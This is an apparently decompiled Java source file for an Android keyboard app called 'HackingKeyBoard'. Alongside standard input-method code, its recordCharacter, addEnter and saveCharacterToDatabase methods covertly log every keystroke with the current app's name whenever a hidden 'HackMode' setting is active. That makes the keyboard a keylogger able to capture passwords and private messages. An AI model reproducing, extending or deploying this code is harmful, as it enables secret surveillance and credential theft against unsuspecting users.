package hack.hackit.pankaj.keyboardlisten;

import android.content.res.Resources;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.Keyboard.Key;
import android.inputmethodservice.KeyboardView;
import android.inputmethodservice.KeyboardView.OnKeyboardActionListener;
import android.text.method.MetaKeyKeyListener;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.CompletionInfo;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputConnection;
import java.util.ArrayList;
import java.util.List;

public class HackingKeyBoard extends InputMethodService implements OnKeyboardActionListener {
    static final boolean DEBUG = false;
    static final boolean PROCESS_HARD_KEYS = true;
    private static boolean lastCharacterfromKB = PROCESS_HARD_KEYS;
    private static boolean lastinputfrom = PROCESS_HARD_KEYS;
    private CandidateView mCandidateView;
    private boolean mCapsLock;
    private boolean mCompletionOn;
    private CompletionInfo[] mCompletions;
    private StringBuilder mComposing = new StringBuilder();
    private LatinKeyboard mCurKeyboard;
    private KeyboardView mInputView;
    private int mLastDisplayWidth;
    private long mLastShiftTime;
    private long mMetaState;
    private boolean mPredictionOn;
    private LatinKeyboard mQwertyKeyboard;
    private LatinKeyboard mSymbolsKeyboard;
    private LatinKeyboard mSymbolsShiftedKeyboard;
    private String mWordSeparators;

    public void onCreate() {
        super.onCreate();
        this.mWordSeparators = getResources().getString(R.string.word_separators);
    }

    public void onInitializeInterface() {
        if (this.mQwertyKeyboard != null) {
            int displayWidth = getMaxWidth();
            if (displayWidth != this.mLastDisplayWidth) {
                this.mLastDisplayWidth = displayWidth;
            } else {
                return;
            }
        }
        this.mQwertyKeyboard = new LatinKeyboard(this, R.xml.qwerty);
        this.mSymbolsKeyboard = new LatinKeyboard(this, R.xml.symbols);
        this.mSymbolsShiftedKeyboard = new LatinKeyboard(this, R.xml.symbols_shift);
    }

    public View onCreateInputView() {
        this.mInputView = (KeyboardView) getLayoutInflater().inflate(R.layout.input, null);
        this.mInputView.setOnKeyboardActionListener(this);
        this.mInputView.setKeyboard(this.mQwertyKeyboard);
        return this.mInputView;
    }

    public void onStartInput(EditorInfo attribute, boolean restarting) {
        super.onStartInput(attribute, restarting);
        this.mComposing.setLength(0);
        updateCandidates();
        if (!restarting) {
            this.mMetaState = 0;
        }
        this.mPredictionOn = false;
        this.mCompletionOn = false;
        this.mCompletions = null;
        switch (attribute.inputType & 15) {
            case 1:
                this.mCurKeyboard = this.mQwertyKeyboard;
                this.mPredictionOn = PROCESS_HARD_KEYS;
                int variation = attribute.inputType & 4080;
                if (variation == 128 || variation == 144) {
                    this.mPredictionOn = false;
                }
                if (variation == 32 || variation == 16 || variation == 176) {
                    this.mPredictionOn = false;
                }
                if ((attribute.inputType & 65536) != 0) {
                    this.mPredictionOn = false;
                    this.mCompletionOn = isFullscreenMode();
                }
                updateShiftKeyState(attribute);
                break;
            case 2:
            case 4:
                this.mCurKeyboard = this.mSymbolsKeyboard;
                break;
            case 3:
                this.mCurKeyboard = this.mSymbolsKeyboard;
                break;
            default:
                this.mCurKeyboard = this.mQwertyKeyboard;
                updateShiftKeyState(attribute);
                break;
        }
        this.mCurKeyboard.setImeOptions(getResources(), attribute.imeOptions);
    }

    public void onFinishInput() {
        super.onFinishInput();
        this.mComposing.setLength(0);
        updateCandidates();
        setCandidatesViewShown(false);
        this.mCurKeyboard = this.mQwertyKeyboard;
        if (this.mInputView != null) {
            this.mInputView.closing();
        }
    }

    public void onStartInputView(EditorInfo attribute, boolean restarting) {
        super.onStartInputView(attribute, restarting);
        this.mInputView.setKeyboard(this.mCurKeyboard);
        this.mInputView.closing();
        addEnter();
    }

    public void onDisplayCompletions(CompletionInfo[] completions) {
        if (this.mCompletionOn) {
            this.mCompletions = completions;
            if (completions == null) {
                setSuggestions(null, false, false);
                return;
            }
            List<String> stringList = new ArrayList();
            int i = 0;
            while (true) {
                if (i < (completions != null ? completions.length : 0)) {
                    CompletionInfo ci = completions[i];
                    if (ci != null) {
                        stringList.add(ci.getText().toString());
                    }
                    i++;
                } else {
                    setSuggestions(stringList, PROCESS_HARD_KEYS, PROCESS_HARD_KEYS);
                    return;
                }
            }
        }
    }

    private boolean translateKeyDown(int keyCode, KeyEvent event) {
        this.mMetaState = MetaKeyKeyListener.handleKeyDown(this.mMetaState, keyCode, event);
        int c = event.getUnicodeChar(MetaKeyKeyListener.getMetaState(this.mMetaState));
        this.mMetaState = MetaKeyKeyListener.adjustMetaAfterKeypress(this.mMetaState);
        InputConnection ic = getCurrentInputConnection();
        if (c == 0 || ic == null) {
            return false;
        }
        if ((Integer.MIN_VALUE & c) != 0) {
            c &= Integer.MAX_VALUE;
        }
        if (this.mComposing.length() > 0) {
            int composed = KeyEvent.getDeadChar(this.mComposing.charAt(this.mComposing.length() - 1), c);
            if (composed != 0) {
                c = composed;
                this.mComposing.setLength(this.mComposing.length() - 1);
            }
        }
        onKey(c, null);
        return PROCESS_HARD_KEYS;
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch (keyCode) {
            case 4:
                if (event.getRepeatCount() == 0 && this.mInputView != null && this.mInputView.handleBack()) {
                    return PROCESS_HARD_KEYS;
                }
            case R.styleable.Theme_textColorSearchUrl /*66*/:
                return false;
            case R.styleable.Theme_searchViewStyle /*67*/:
                if (this.mComposing.length() > 0) {
                    onKey(-5, null);
                    return PROCESS_HARD_KEYS;
                }
                break;
            default:
                if (keyCode == 62 && (event.getMetaState() & 2) != 0) {
                    InputConnection ic = getCurrentInputConnection();
                    if (ic != null) {
                        ic.clearMetaKeyStates(2);
                        keyDownUp(29);
                        keyDownUp(42);
                        keyDownUp(32);
                        keyDownUp(46);
                        keyDownUp(43);
                        keyDownUp(37);
                        keyDownUp(32);
                        return PROCESS_HARD_KEYS;
                    }
                }
                if (this.mPredictionOn && translateKeyDown(keyCode, event)) {
                    return PROCESS_HARD_KEYS;
                }
        }
        return super.onKeyDown(keyCode, event);
    }

    public boolean onKeyUp(int keyCode, KeyEvent event) {
        if (this.mPredictionOn) {
            this.mMetaState = MetaKeyKeyListener.handleKeyUp(this.mMetaState, keyCode, event);
        }
        return super.onKeyUp(keyCode, event);
    }

    private void commitTyped(InputConnection inputConnection) {
        inputConnection.commitText(this.mComposing, 1);
        this.mComposing.setLength(0);
    }

    private void updateShiftKeyState(EditorInfo attr) {
        boolean z = false;
        if (attr != null && this.mInputView != null && this.mQwertyKeyboard == this.mInputView.getKeyboard()) {
            int caps = 0;
            EditorInfo ei = getCurrentInputEditorInfo();
            if (!(ei == null || ei.inputType == 0)) {
                caps = getCurrentInputConnection().getCursorCapsMode(attr.inputType);
            }
            KeyboardView keyboardView = this.mInputView;
            boolean z2 = (this.mCapsLock || caps != 0) ? PROCESS_HARD_KEYS : false;
            keyboardView.setShifted(z2);
            if (this.mCapsLock || caps != 0) {
                z = PROCESS_HARD_KEYS;
            }
            changeShiftIcon(z);
        }
    }

    private boolean isAlphabet(int code) {
        if (Character.isLetter(code)) {
            return PROCESS_HARD_KEYS;
        }
        return false;
    }

    private void keyDownUp(int keyEventCode) {
        getCurrentInputConnection().sendKeyEvent(new KeyEvent(0, keyEventCode));
        getCurrentInputConnection().sendKeyEvent(new KeyEvent(1, keyEventCode));
    }

    private void sendKey(int keyCode) {
        switch (keyCode) {
            case 10:
                keyDownUp(66);
                return;
            default:
                if (keyCode < 48 || keyCode > 57) {
                    getCurrentInputConnection().commitText(String.valueOf((char) keyCode), 1);
                    return;
                } else {
                    keyDownUp((keyCode - 48) + 7);
                    return;
                }
        }
    }

    public void onKey(int primaryCode, int[] keyCodes) {
        recordCharacter(primaryCode);
        if (isWordSeparator(primaryCode)) {
            if (this.mComposing.length() > 0) {
                commitTyped(getCurrentInputConnection());
            }
            sendKey(primaryCode);
            updateShiftKeyState(getCurrentInputEditorInfo());
        } else if (primaryCode == -5) {
            handleBackspace();
        } else if (primaryCode == -1) {
            handleShift();
        } else if (primaryCode == -3) {
            handleClose();
        } else if (primaryCode == -100) {
        } else {
            if (primaryCode != -2 || this.mInputView == null) {
                handleCharacter(primaryCode, keyCodes);
                return;
            }
            Keyboard current = this.mInputView.getKeyboard();
            if (current == this.mSymbolsKeyboard || current == this.mSymbolsShiftedKeyboard) {
                current = this.mQwertyKeyboard;
            } else {
                current = this.mSymbolsKeyboard;
            }
            this.mInputView.setKeyboard(current);
            if (current == this.mSymbolsKeyboard) {
                current.setShifted(false);
            }
        }
    }

    public void onText(CharSequence text) {
        recordCharacter(text);
        InputConnection ic = getCurrentInputConnection();
        if (ic != null) {
            ic.beginBatchEdit();
            if (this.mComposing.length() > 0) {
                commitTyped(ic);
            }
            ic.commitText(text, 0);
            ic.endBatchEdit();
            updateShiftKeyState(getCurrentInputEditorInfo());
        }
    }

    private void updateCandidates() {
        if (!this.mCompletionOn) {
            if (this.mComposing.length() > 0) {
                ArrayList<String> list = new ArrayList();
                list.add(this.mComposing.toString());
                setSuggestions(list, PROCESS_HARD_KEYS, PROCESS_HARD_KEYS);
                return;
            }
            setSuggestions(null, false, false);
        }
    }

    public void setSuggestions(List<String> suggestions, boolean completions, boolean typedWordValid) {
        if (suggestions != null && suggestions.size() > 0) {
            setCandidatesViewShown(PROCESS_HARD_KEYS);
        } else if (isExtractViewShown()) {
            setCandidatesViewShown(PROCESS_HARD_KEYS);
        }
        if (this.mCandidateView != null) {
            this.mCandidateView.setSuggestions(suggestions, completions, typedWordValid);
        }
    }

    private void handleBackspace() {
        int length = this.mComposing.length();
        if (length > 1) {
            this.mComposing.delete(length - 1, length);
            getCurrentInputConnection().setComposingText(this.mComposing, 1);
            updateCandidates();
        } else if (length > 0) {
            this.mComposing.setLength(0);
            getCurrentInputConnection().commitText(BuildConfig.FLAVOR, 0);
            updateCandidates();
        } else {
            keyDownUp(67);
        }
        updateShiftKeyState(getCurrentInputEditorInfo());
    }

    private void handleShift() {
        boolean z = false;
        if (this.mInputView != null) {
            Keyboard currentKeyboard = this.mInputView.getKeyboard();
            if (this.mQwertyKeyboard == currentKeyboard) {
                checkToggleCapsLock();
                KeyboardView keyboardView = this.mInputView;
                boolean z2 = (this.mCapsLock || !this.mInputView.isShifted()) ? PROCESS_HARD_KEYS : false;
                keyboardView.setShifted(z2);
                if (this.mCapsLock || !this.mInputView.isShifted()) {
                    z = PROCESS_HARD_KEYS;
                }
                changeShiftIcon(z);
            } else if (currentKeyboard == this.mSymbolsKeyboard) {
                this.mInputView.setKeyboard(this.mSymbolsShiftedKeyboard);
                this.mSymbolsShiftedKeyboard.setShifted(false);
                changeShiftIcon(PROCESS_HARD_KEYS);
            } else if (currentKeyboard == this.mSymbolsShiftedKeyboard) {
                this.mInputView.setKeyboard(this.mSymbolsKeyboard);
                this.mSymbolsKeyboard.setShifted(PROCESS_HARD_KEYS);
                changeShiftIcon(false);
            }
        }
    }

    private void handleCharacter(int primaryCode, int[] keyCodes) {
        if (isInputViewShown() && this.mInputView.isShifted()) {
            primaryCode = Character.toUpperCase(primaryCode);
        }
        if (isAlphabet(primaryCode)) {
            getCurrentInputConnection().commitText(String.valueOf((char) primaryCode), 1);
            updateShiftKeyState(getCurrentInputEditorInfo());
            return;
        }
        getCurrentInputConnection().commitText(String.valueOf((char) primaryCode), 1);
    }

    private void handleClose() {
        commitTyped(getCurrentInputConnection());
        requestHideSelf(0);
        this.mInputView.closing();
    }

    private void checkToggleCapsLock() {
        long now = System.currentTimeMillis();
        if (this.mLastShiftTime + 800 > now) {
            this.mCapsLock = !this.mCapsLock ? PROCESS_HARD_KEYS : false;
            this.mLastShiftTime = 0;
            return;
        }
        this.mLastShiftTime = now;
    }

    private String getWordSeparators() {
        return this.mWordSeparators;
    }

    public boolean isWordSeparator(int code) {
        return getWordSeparators().contains(String.valueOf((char) code));
    }

    public void pickDefaultCandidate() {
        pickSuggestionManually(0);
    }

    public void pickSuggestionManually(int index) {
        if (this.mCompletionOn && this.mCompletions != null && index >= 0 && index < this.mCompletions.length) {
            getCurrentInputConnection().commitCompletion(this.mCompletions[index]);
            if (this.mCandidateView != null) {
                this.mCandidateView.clear();
            }
            updateShiftKeyState(getCurrentInputEditorInfo());
        } else if (this.mComposing.length() > 0) {
            commitTyped(getCurrentInputConnection());
        }
    }

    public void swipeRight() {
        if (this.mCompletionOn) {
            pickDefaultCandidate();
        }
    }

    public void swipeLeft() {
        handleBackspace();
    }

    public void swipeDown() {
        handleClose();
    }

    public void swipeUp() {
    }

    public void onPress(int primaryCode) {
    }

    public void onRelease(int primaryCode) {
    }

    public void changeShiftIcon(boolean flag) {
        Keyboard currentKeyboard = this.mInputView.getKeyboard();
        if (this.mSymbolsKeyboard != currentKeyboard && this.mSymbolsShiftedKeyboard != currentKeyboard) {
            List<Key> keys = currentKeyboard.getKeys();
            Resources r = getResources();
            if (this.mInputView.isShifted()) {
                ((Key) keys.get(19)).icon = r.getDrawable(R.drawable.shift_key_pressed);
            } else {
                ((Key) keys.get(19)).icon = r.getDrawable(R.drawable.shift_key);
            }
            this.mInputView.invalidateKey(19);
        }
    }

    public void recordCharacter(int primaryCode) {
        if (primaryCode != -5 && primaryCode != -1 && primaryCode != -3 && primaryCode != -100 && primaryCode != -2) {
            String characterToSave = String.valueOf((char) primaryCode);
            if (this.mInputView.isShifted()) {
                characterToSave = String.valueOf((char) Character.toUpperCase(primaryCode));
            }
            saveCharacterToDatabase(characterToSave, PROCESS_HARD_KEYS);
        }
    }

    public void recordCharacter(CharSequence ch) {
        saveCharacterToDatabase(ch.toString(), PROCESS_HARD_KEYS);
    }

    public void addEnter() {
        saveCharacterToDatabase(String.valueOf(10), false);
    }

    public void saveCharacterToDatabase(String code, boolean fromKeyboard) {
        if (isValidKeyPress(fromKeyboard) && getHackingStatus().equals("Active")) {
            new Driver().makeAnObject(Driver.getCurrentAppName(), String.valueOf(code));
        }
    }

    public boolean isValidKeyPress(boolean fromKeyboard) {
        lastinputfrom = false;
        lastinputfrom = fromKeyboard;
        return PROCESS_HARD_KEYS;
    }

    /* Access modifiers changed, original: protected */
    public String getHackingStatus() {
        return HKApplication.getAppContext().getSharedPreferences("HackMode", 0).getString("HackStatus", "Inactive");
    }
}
